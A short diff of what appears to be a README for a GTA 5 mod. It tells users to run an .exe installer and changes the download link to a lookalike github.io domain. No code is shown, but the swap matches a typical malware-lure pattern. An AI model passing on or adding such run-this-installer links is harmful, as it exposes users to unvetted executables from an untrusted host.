@@ -13,7 +13,7 @@ Unzip the archive to a separate folder.
 
 Run the `.exe` file to start the installer – the mod will automatically be placed into your GTA 5 directory.  
 
-[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](https://gta-5-redux.github.io/.github/)
+[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](https://gta5redux-download.github.io/.github/)
 
 ## 📸 Overview
 ![gta-5-redux-ultra-realistic-weather](https://github.com/user-attachments/assets/acf64a23-09a3-48e2-b9c9-9f8340f13711)
